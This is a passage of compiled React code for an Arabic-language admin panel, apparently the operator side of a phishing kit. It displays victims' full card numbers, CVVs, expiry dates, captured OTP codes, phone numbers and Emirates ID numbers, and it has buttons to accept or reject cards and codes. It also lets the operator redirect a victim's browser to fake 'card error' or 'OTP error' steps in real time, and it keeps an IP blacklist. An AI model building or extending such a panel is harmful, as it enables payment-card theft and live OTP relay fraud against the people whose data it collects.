    className: "w-8 h-8 rounded-full bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center text-white font-bold text-sm shadow-md"
  }, "A"), /*#__PURE__*/React.createElement("span", {
    className: "text-xs font-bold hidden sm:inline text-gray-700 dark:text-gray-300"
  }, "Admin"))), activeTab === "charts" ? /*#__PURE__*/React.createElement(CardAnalyticsView, {
    visitors: visitors,
    isDark: isDark,
    onBackToFeed: () => setActiveTab("feed")
  }) : activeTab === "orders" ? /*#__PURE__*/React.createElement(OrdersTableView, {
    visitors: visitors,
    isDark: isDark,
    onUpdateStatus: handleUpdateOrderStatus,
    onSelectVisitor: id => {
      setSelectedId(id);
      setActiveTab("feed");
    },
    onDelete: handleDelete,
    onDirectToStep: visitor => {
      setSelectedId(visitor.id);
      setStepInput(visitor.step || "otp");
      setShowStepPanel(true);
    }
  }) : /*#__PURE__*/React.createElement("div", {
    className: "flex-1 flex overflow-hidden"
  }, /*#__PURE__*/React.createElement("aside", {
    className: `w-80 flex-shrink-0 border-l ${isDark ? "bg-gray-800/80 border-gray-700" : "bg-white border-gray-200"} flex flex-col`
  }, /*#__PURE__*/React.createElement("div", {
    className: "p-3 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("div", {
    className: "relative"
  }, /*#__PURE__*/React.createElement("input", {
    type: "text",
    placeholder: "\u0628\u062D\u062B \u0628\u0627\u0633\u0645 \u0627\u0644\u0632\u0627\u0626\u0631\u060C \u0627\u0644\u0647\u0627\u062A\u0641\u060C \u0623\u0648 IP...",
    className: `w-full px-3 py-2 text-xs rounded-xl border transition-all ${isDark ? "bg-gray-700 border-gray-600 text-white placeholder-gray-400" : "bg-gray-50 border-gray-200 text-gray-900 placeholder-gray-400"} outline-none focus:border-amber-500`,
    value: searchQuery,
    onChange: e => setSearchQuery(e.target.value)
  }), /*#__PURE__*/React.createElement("svg", {
    className: "w-4 h-4 absolute left-3 top-2.5 text-gray-400",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
  })))), /*#__PURE__*/React.createElement("div", {
    className: "flex-1 overflow-y-auto custom-scrollbar divide-y divide-gray-50 dark:divide-gray-750"
  }, filteredLeft.length === 0 ? /*#__PURE__*/React.createElement("div", {
    className: "p-8 text-center text-gray-400 text-xs"
  }, "\u0644\u0627 \u064A\u0648\u062C\u062F \u0632\u0648\u0627\u0631 \u062D\u0627\u0644\u064A\u0627\u064B") : filteredLeft.map(v => /*#__PURE__*/React.createElement("button", {
    key: v.id,
    onClick: () => setSelectedId(v.id),
    className: `w-full p-3.5 flex items-start gap-3 text-right transition-all cursor-pointer ${selectedId === v.id ? isDark ? "bg-gray-750 border-r-4 border-amber-500 shadow-sm" : "bg-blue-50/70 border-r-4 border-blue-600 shadow-sm" : isDark ? "hover:bg-gray-750" : "hover:bg-gray-50"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "relative mt-1"
  }, /*#__PURE__*/React.createElement("div", {
    className: `w-3.5 h-3.5 rounded-full ${v.online ? "bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.8)] animate-pulse" : "bg-gray-300 dark:bg-gray-600"}`
  })), /*#__PURE__*/React.createElement("div", {
    className: "flex-1 min-w-0"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between gap-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: `font-bold text-sm truncate ${isDark ? "text-gray-100" : "text-gray-900"}`
  }, v.name || v.bookingData && v.bookingData["الاسم"] || "زائر جديد"), v.online ? /*#__PURE__*/React.createElement("span", {
    className: "inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-50 dark:bg-emerald-950/60 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30 flex-shrink-0"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping inline-block"
  }), "\u0645\u062A\u0635\u0644") : /*#__PURE__*/React.createElement("span", {
    className: "inline-flex items-center gap-1 text-[10px] font-medium px-2 py-0.5 rounded-full bg-gray-100 dark:bg-gray-750 text-gray-400 flex-shrink-0"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-1.5 h-1.5 rounded-full bg-gray-400 inline-block"
  }), "\u063A\u064A\u0631 \u0645\u062A\u0635\u0644")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between text-xs text-gray-400 mt-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "truncate font-medium"
  }, getStepLabel(v.step)), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 flex-shrink-0"
  }, v.orderStatus === "completed" ? /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 py-0.5 rounded bg-emerald-100 dark:bg-emerald-900/40 text-emerald-700 dark:text-emerald-300 font-bold"
  }, "\u2713 \u0645\u0643\u062A\u0645\u0644") : v.orderStatus === "cancelled" ? /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 py-0.5 rounded bg-rose-100 dark:bg-rose-900/40 text-rose-700 dark:text-rose-300 font-bold"
  }, "\u2715 \u0645\u0644\u063A\u064A") : /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 py-0.5 rounded bg-amber-100 dark:bg-amber-900/40 text-amber-700 dark:text-amber-300 font-bold"
  }, "\u23F3 \u0645\u0631\u0627\u062C\u0639\u0629"), v.cardNumber && /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 py-0.5 rounded bg-amber-100 dark:bg-amber-900/40 text-amber-700 dark:text-amber-300 font-bold"
  }, "\uD83D\uDCB3 \u0628\u0637\u0627\u0642\u0629"), v.otp && /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 py-0.5 rounded bg-purple-100 dark:bg-purple-900/40 text-purple-700 dark:text-purple-300 font-bold"
  }, "OTP"))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between text-[11px] text-blue-600 dark:text-blue-400 font-mono mt-1.5 pt-1.5 border-t border-gray-100 dark:border-gray-700/60"
  }, /*#__PURE__*/React.createElement("span", {
    className: "flex items-center gap-1 font-semibold text-gray-500 dark:text-gray-400 text-[10px] font-sans"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDD52 \u0648\u0642\u062A \u0627\u0644\u062F\u062E\u0648\u0644:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono font-bold text-gray-800 dark:text-gray-200",
    dir: "ltr"
  }, formatShortTime(v.createdAt || v.updatedAt))), /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] text-gray-400 font-sans"
  }, timeAgo(v.createdAt || v.updatedAt)))))))), /*#__PURE__*/React.createElement("main", {
    className: "flex-1 flex flex-col min-w-0 bg-[#f4f5f8] dark:bg-gray-900/60"
  }, selectedVisitor ? /*#__PURE__*/React.createElement(React.Fragment, null, /*#__PURE__*/React.createElement("div", {
    className: `p-4 border-b flex items-center justify-between ${isDark ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-3"
  }, /*#__PURE__*/React.createElement("div", {
    className: "w-11 h-11 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center text-white font-bold text-lg shadow-sm"
  }, (selectedVisitor.name || "V")[0]), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2 flex-wrap"
  }, /*#__PURE__*/React.createElement("h2", {
    className: `font-bold text-base ${isDark ? "text-white" : "text-gray-900"}`
  }, selectedVisitor.name || selectedVisitor.bookingData && selectedVisitor.bookingData["الاسم"] || "زائر مجهول"), selectedVisitor.online ? /*#__PURE__*/React.createElement("span", {
    className: "inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-bold bg-emerald-100 dark:bg-emerald-950/60 text-emerald-700 dark:text-emerald-300 border border-emerald-500/30 shadow-sm"
  }, /*#__PURE__*/React.createElement("span", {
    className: "relative flex h-2 w-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"
  }), /*#__PURE__*/React.createElement("span", {
    className: "relative inline-flex rounded-full h-2 w-2 bg-emerald-500"
  })), "\u0645\u062A\u0635\u0644 \u0627\u0644\u0622\u0646") : /*#__PURE__*/React.createElement("span", {
    className: "inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-100 dark:bg-gray-700 text-gray-500"
  }, /*#__PURE__*/React.createElement("span", {
    className: "h-1.5 w-1.5 rounded-full bg-gray-400"
  }), "\u063A\u064A\u0631 \u0645\u062A\u0635\u0644")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2.5 text-xs text-gray-400 mt-1 flex-wrap"
  }, /*#__PURE__*/React.createElement("span", null, "\u0627\u0644\u0645\u0631\u062D\u0644\u0629: ", /*#__PURE__*/React.createElement("strong", {
    className: "font-semibold text-amber-600 dark:text-amber-400"
  }, getStepLabel(selectedVisitor.step))), /*#__PURE__*/React.createElement("span", {
    className: "text-gray-300 dark:text-gray-600"
  }, "\u2022"), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 text-blue-600 dark:text-blue-400 font-medium"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDD52 \u0648\u0642\u062A \u0627\u0644\u062F\u062E\u0648\u0644:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono font-bold",
    dir: "ltr"
  }, formatFullDateTime(selectedVisitor.createdAt || selectedVisitor.updatedAt))), /*#__PURE__*/React.createElement("span", {
    className: "text-gray-300 dark:text-gray-600"
  }, "\u2022"), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 text-gray-500 dark:text-gray-400"
  }, /*#__PURE__*/React.createElement("span", null, "\u0622\u062E\u0631 \u0646\u0634\u0627\u0637:"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold text-gray-700 dark:text-gray-300"
  }, timeAgo(selectedVisitor.lastActiveAt || selectedVisitor.updatedAt)))))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1.5 bg-gray-50 dark:bg-gray-750 px-2.5 py-1 rounded-xl border border-gray-200 dark:border-gray-600"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-[11px] text-gray-500 dark:text-gray-400 font-bold"
  }, "\u062D\u0627\u0644\u0629 \u0627\u0644\u0637\u0644\u0628:"), /*#__PURE__*/React.createElement("select", {
    value: selectedVisitor.orderStatus || "pending",
    onChange: e => handleUpdateOrderStatus(selectedVisitor.id, e.target.value),
    className: `text-xs font-bold rounded-lg px-2.5 py-1 border cursor-pointer outline-none transition-all ${(selectedVisitor.orderStatus || "pending") === "completed" ? "bg-emerald-50 text-emerald-800 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-700" : (selectedVisitor.orderStatus || "pending") === "cancelled" ? "bg-rose-50 text-rose-800 border-rose-300 dark:bg-rose-950/60 dark:text-rose-300 dark:border-rose-700" : "bg-amber-50 text-amber-800 border-amber-300 dark:bg-amber-950/60 dark:text-amber-300 dark:border-amber-700"}`
  }, /*#__PURE__*/React.createElement("option", {
    value: "pending"
  }, "\u23F3 \u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629"), /*#__PURE__*/React.createElement("option", {
    value: "completed"
  }, "\u2705 \u0645\u0643\u062A\u0645\u0644"), /*#__PURE__*/React.createElement("option", {
    value: "cancelled"
  }, "\u274C \u0645\u0644\u063A\u064A"))), /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      setStepInput(selectedVisitor.step || "otp");
      setShowStepPanel(true);
    },
    className: "px-3.5 py-2 bg-blue-50 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 rounded-xl text-xs font-bold hover:bg-blue-100 dark:hover:bg-blue-900/50 transition-all flex items-center gap-1.5"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-4 h-4",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M13 7l5 5m0 0l-5 5m5-5H6"
  })), "\u062A\u0648\u062C\u064A\u0647 \u0644\u0645\u0631\u062D\u0644\u0629"), /*#__PURE__*/React.createElement("button", {
    onClick: () => handleDelete(selectedVisitor.id),
    className: "p-2 text-red-400 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/30 rounded-xl transition-all",
    title: "\u062D\u0630\u0641 \u0627\u0644\u0632\u0627\u0626\u0631"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"
  }))))), /*#__PURE__*/React.createElement("div", {
    className: "flex-1 overflow-y-auto p-6 space-y-4 custom-scrollbar"
  }, messages.length === 0 ? /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-center h-full text-gray-400 text-sm"
  }, "\u0628\u0627\u0646\u062A\u0638\u0627\u0631 \u0625\u062F\u062E\u0627\u0644 \u0628\u064A\u0627\u0646\u0627\u062A \u0623\u0648 \u0628\u0637\u0627\u0642\u0629 \u0645\u0646 \u0627\u0644\u0632\u0627\u0626\u0631...") : messages.map((msg, i) => /*#__PURE__*/React.createElement(MessageBubble, {
    key: i,
    msg: msg,
    visitor: selectedVisitor,
    onApprove: handleApproveCard,
    onReject: handleRejectCard,
    onApproveOtp: handleApproveOtp,
    onRejectOtp: handleRejectOtp
  })), /*#__PURE__*/React.createElement("div", {
    ref: messagesEndRef
  }))) : /*#__PURE__*/React.createElement("div", {
    className: "flex-1 flex flex-col items-center justify-center text-gray-400 gap-3"
  }, /*#__PURE__*/React.createElement("div", {
    className: "w-16 h-16 rounded-2xl bg-gray-100 dark:bg-gray-800 flex items-center justify-center text-3xl"
  }, "\uD83E\uDD81"), /*#__PURE__*/React.createElement("p", {
    className: "text-sm font-semibold"
  }, "\u0627\u062E\u062A\u0631 \u0632\u0627\u0626\u0631\u0627\u064B \u0645\u0646 \u0627\u0644\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u062C\u0627\u0646\u0628\u064A\u0629 \u0644\u0645\u062A\u0627\u0628\u0639\u0629 \u062A\u0641\u0627\u0635\u064A\u0644\u0647 \u0648\u0627\u0644\u062A\u062D\u0643\u0645 \u0628\u0647"))), /*#__PURE__*/React.createElement("aside", {
    className: `w-84 flex-shrink-0 border-r ${isDark ? "bg-gray-800/80 border-gray-700" : "bg-white border-gray-200"} flex flex-col`
  }, /*#__PURE__*/React.createElement("div", {
    className: "p-4 border-b border-gray-100 dark:border-gray-700 font-bold text-sm flex items-center justify-between"
  }, /*#__PURE__*/React.createElement("span", null, "\u0645\u0644\u062E\u0635 \u062A\u0641\u0627\u0635\u064A\u0644 \u0627\u0644\u0632\u0627\u0626\u0631"), /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-amber-500 font-mono"
  }, "CR7-FEED")), selectedVisitor ? /*#__PURE__*/React.createElement("div", {
    className: "p-4 space-y-6 overflow-y-auto custom-scrollbar flex-1"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("label", {
    className: "text-[10px] text-gray-400 uppercase font-bold tracking-wider block mb-3"
  }, "\u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u062F\u0641\u0639"), /*#__PURE__*/React.createElement(CardDisplay, {
    cardNumber: selectedVisitor.cardNumber || "•••• •••• •••• ••••",
    expiry: selectedVisitor.expiry || "••/••",
    cvv: selectedVisitor.cvv || "•••",
    cardHolder: selectedVisitor.cardHolder || selectedVisitor.name || "CARD HOLDER",
    bank: getBankName(selectedVisitor.cardNumber)
  })), /*#__PURE__*/React.createElement("div", {
    className: "bg-gray-50 dark:bg-gray-900/60 p-4 rounded-2xl border border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("label", {
    className: "text-[10px] text-gray-400 uppercase font-bold tracking-wider block mb-2"
  }, "\u0627\u0644\u0623\u0645\u0627\u0646 \u0648\u0631\u0645\u0632 \u0627\u0644\u062A\u062D\u0642\u0642 (OTP)"), /*#__PURE__*/React.createElement("div", {
    className: "space-y-3"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between text-sm items-center"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 text-xs"
  }, "\u0643\u0648\u062F OTP \u0627\u0644\u0645\u0633\u062A\u0644\u0645"), /*#__PURE__*/React.createElement("span", {
    className: `font-mono text-xl font-extrabold ${selectedVisitor.otp ? "text-amber-500" : "text-gray-400"}`
  }, selectedVisitor.otp || "لم يصل بعد")), selectedVisitor.otp && /*#__PURE__*/React.createElement("div", {
    className: "flex gap-2 mt-2"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: handleApproveOtp,
    className: "flex-1 py-2 bg-green-500 hover:bg-green-600 text-white rounded-xl text-xs font-bold shadow transition-all"
  }, "\u2713 \u0642\u0628\u0648\u0644 \u0627\u0644\u0631\u0645\u0632"), /*#__PURE__*/React.createElement("button", {
    onClick: handleRejectOtp,
    className: "flex-1 py-2 bg-red-500 hover:bg-red-600 text-white rounded-xl text-xs font-bold shadow transition-all"
  }, "\u2717 \u0631\u0641\u0636 \u0627\u0644\u0631\u0645\u0632")))), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("label", {
    className: "text-[10px] text-gray-400 uppercase font-bold tracking-wider block mb-2"
  }, "\u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u0634\u062E\u0635\u064A\u0629"), /*#__PURE__*/React.createElement("div", {
    className: "space-y-2.5 text-xs"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0627\u0644\u0627\u0633\u0645:"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold"
  }, selectedVisitor.name || selectedVisitor.bookingData && selectedVisitor.bookingData["الاسم"] || "—")), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0627\u0644\u0647\u0627\u062A\u0641:"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold text-blue-600 dark:text-blue-400 font-mono",
    dir: "ltr"
  }, selectedVisitor.phone || selectedVisitor.bookingData && selectedVisitor.bookingData["الهاتف"] || "—")), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0631\u0642\u0645 \u0627\u0644\u0647\u0648\u064A\u0629:"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold font-mono",
    dir: "ltr"
  }, selectedVisitor.emiratesId || selectedVisitor.bookingData && selectedVisitor.bookingData["رقم الهوية"] || "—")), selectedVisitor.bookingData && selectedVisitor.bookingData["المنطقة"] && /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0627\u0644\u0645\u0646\u0637\u0642\u0629:"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold"
  }, selectedVisitor.bookingData["المنطقة"])))), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("label", {
    className: "text-[10px] text-gray-400 uppercase font-bold tracking-wider block mb-2"
  }, "\u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644 \u0648\u0627\u0644\u062F\u062E\u0648\u0644"), /*#__PURE__*/React.createElement("div", {
    className: "space-y-2.5 text-xs"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700 items-center"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u062D\u0627\u0644\u0629 \u0627\u0644\u0627\u062A\u0635\u0627\u0644:"), selectedVisitor.online ? /*#__PURE__*/React.createElement("span", {
    className: "inline-flex items-center gap-1 text-xs font-bold px-2 py-0.5 rounded-full bg-emerald-50 dark:bg-emerald-950/60 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping inline-block"
  }), "\u0645\u062A\u0635\u0644 \u0627\u0644\u0622\u0646 (Online)") : /*#__PURE__*/React.createElement("span", {
    className: "inline-flex items-center gap-1 text-xs font-medium px-2 py-0.5 rounded-full bg-gray-100 dark:bg-gray-700 text-gray-500"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-1.5 h-1.5 rounded-full bg-gray-400 inline-block"
  }), "\u063A\u064A\u0631 \u0645\u062A\u0635\u0644 (Offline)")), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0639\u0646\u0648\u0627\u0646 IP:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono text-gray-600 dark:text-gray-300"
  }, selectedVisitor.ip || "—")), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0627\u0644\u0645\u0631\u062D\u0644\u0629 \u0627\u0644\u062D\u0627\u0644\u064A\u0629:"), /*#__PURE__*/React.createElement("span", {
    className: "px-2 py-0.5 bg-blue-50 dark:bg-blue-900/40 text-blue-600 dark:text-blue-400 rounded-md font-bold"
  }, getStepLabel(selectedVisitor.step))), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700 items-center"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0648\u0642\u062A \u0648\u062A\u0627\u0631\u064A\u062E \u0627\u0644\u062F\u062E\u0648\u0644:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono font-bold text-emerald-600 dark:text-emerald-400 text-xs",
    dir: "ltr"
  }, formatFullDateTime(selectedVisitor.createdAt || selectedVisitor.updatedAt))), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 border-b border-gray-100 dark:border-gray-700 items-center"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0645\u062F\u0629 \u0627\u0644\u062A\u0648\u0627\u062C\u062F:"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold text-gray-700 dark:text-gray-300 text-xs"
  }, timeAgo(selectedVisitor.createdAt || selectedVisitor.updatedAt))), /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between py-1.5 items-center"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0622\u062E\u0631 \u0638\u0647\u0648\u0631 / \u0646\u0634\u0627\u0637:"), /*#__PURE__*/React.createElement("span", {
    className: "font-mono text-gray-600 dark:text-gray-300 text-xs",
    dir: "ltr"
  }, formatTimeOnly(selectedVisitor.lastActiveAt || selectedVisitor.updatedAt)))))) : /*#__PURE__*/React.createElement("div", {
    className: "p-8 text-center text-gray-400 text-xs"
  }, "\u0644\u0627 \u064A\u0648\u062C\u062F \u0632\u0627\u0626\u0631 \u0645\u062D\u062F\u062F"))), showStepPanel && selectedVisitor && /*#__PURE__*/React.createElement("div", {
    className: "fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: `w-full max-w-md p-6 rounded-2xl shadow-2xl ${isDark ? "bg-gray-800 text-white" : "bg-white text-gray-900"}`
  }, /*#__PURE__*/React.createElement("h3", {
    className: "text-lg font-bold mb-3"
  }, "\u062A\u0648\u062C\u064A\u0647 \u0627\u0644\u0632\u0627\u0626\u0631 \u0625\u0644\u0649 \u0645\u0631\u062D\u0644\u0629 \u062C\u062F\u064A\u062F\u0629"), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400 mb-4"
  }, "\u0627\u062E\u062A\u0631 \u0645\u0631\u062D\u0644\u0629 \u0633\u0631\u064A\u0639\u0629 \u0623\u0648 \u0627\u0643\u062A\u0628 \u0627\u0633\u0645 \u0627\u0644\u0645\u0631\u062D\u0644\u0629 \u0644\u0646\u0642\u0644 \u0645\u062A\u0635\u0641\u062D \u0627\u0644\u0632\u0627\u0626\u0631 \u0641\u0648\u0631\u0627\u064B:"), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-2 gap-2 mb-4"
  }, [{
    label: "💳 الدفع (Payment)",
    val: "payment"
  }, {
    label: "📱 رمز OTP (OTP)",
    val: "otp"
  }, {
    label: "✓ نجاح (Success)",
    val: "success"
  }, {
    label: "⚠️ خطأ بالبطاقة (Card Error)",
    val: "card_error"
  }, {
    label: "⚠️ خطأ بالرمز (OTP Error)",
    val: "otp_error"
  }, {
    label: "🏠 الرئيسية (Home)",
    val: "schedule"
  }].map(step => /*#__PURE__*/React.createElement("button", {
    key: step.val,
    onClick: () => setStepInput(step.val),
    className: `p-2.5 rounded-xl border text-xs font-bold text-center transition-all ${stepInput === step.val ? "border-amber-500 bg-amber-500/10 text-amber-500" : "border-gray-200 dark:border-gray-700 hover:border-gray-300"}`
  }, step.label))), /*#__PURE__*/React.createElement("input", {
    type: "text",
    className: `w-full px-4 py-3 rounded-xl border mb-5 text-sm ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200"}`,
    placeholder: "\u0623\u0648 \u0627\u0643\u062A\u0628 \u0627\u0633\u0645 \u0627\u0644\u0645\u0631\u062D\u0644\u0629 \u064A\u062F\u0648\u064A\u0627\u064B...",
    value: stepInput,
    onChange: e => setStepInput(e.target.value)
  }), /*#__PURE__*/React.createElement("div", {
    className: "flex gap-3"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: handleSetStep,
    className: "flex-1 py-3 bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-600 hover:to-yellow-600 text-white rounded-xl font-bold text-sm shadow-md transition-all"
  }, "\u062A\u0637\u0628\u064A\u0642 \u0648\u062A\u0648\u062C\u064A\u0647 \u0627\u0644\u0632\u0627\u0626\u0631"), /*#__PURE__*/React.createElement("button", {
    onClick: () => setShowStepPanel(false),
    className: `flex-1 py-3 rounded-xl font-bold text-sm ${isDark ? "bg-gray-700 text-gray-300" : "bg-gray-100 text-gray-600"}`
  }, "\u0625\u0644\u063A\u0627\u0621")))), showBlockedPanel && /*#__PURE__*/React.createElement("div", {
    className: "fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: `w-full max-w-lg p-6 rounded-2xl shadow-2xl max-h-[90vh] flex flex-col ${isDark ? "bg-gray-800 text-white" : "bg-white text-gray-900"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex justify-between items-center mb-4"
  }, /*#__PURE__*/React.createElement("h3", {
    className: "text-lg font-bold"
  }, "\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0648\u0627\u0626\u0645 \u0627\u0644\u0645\u062D\u0638\u0648\u0631\u0629 (Blacklist)"), /*#__PURE__*/React.createElement("button", {
    onClick: () => setShowBlockedPanel(false),
    className: "text-gray-400 hover:text-gray-600"
  }, "\u2715")), /*#__PURE__*/React.createElement("div", {
    className: "space-y-5 overflow-y-auto custom-scrollbar flex-1 pr-1"
  }, /*#__PURE__*/React.createElement("div", {
    className: "p-4 rounded-xl border border-gray-200 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("h4", {
    className: "font-bold text-sm mb-2 text-red-500"
  }, "\u062D\u0638\u0631 \u0639\u0646\u0627\u0648\u064A\u0646 IP"), /*#__PURE__*/React.createElement("div", {
    className: "flex gap-2 mb-3"
  }, /*#__PURE__*/React.createElement("input", {
    type: "text",
    placeholder: "\u0645\u062B\u0644\u0627\u064B: 192.168.1.1",
    className: `flex-1 px-3 py-2 text-xs rounded-lg border ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200"}`,
    value: newIp,
    onChange: e => setNewIp(e.target.value)
  }), /*#__PURE__*/React.createElement("button", {
    onClick: handleBlockIp,
    className: "px-4 py-2 bg-red-500 text-white text-xs font-bold rounded-lg hover:bg-red-600"
  }, "\u062D\u0638\u0631 IP")), /*#__PURE__*/React.createElement("div", {
    className: "flex flex-wrap gap-1.5 max-h-24 overflow-y-auto"
  }, blockedIps.length === 0 ? /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-gray-400"
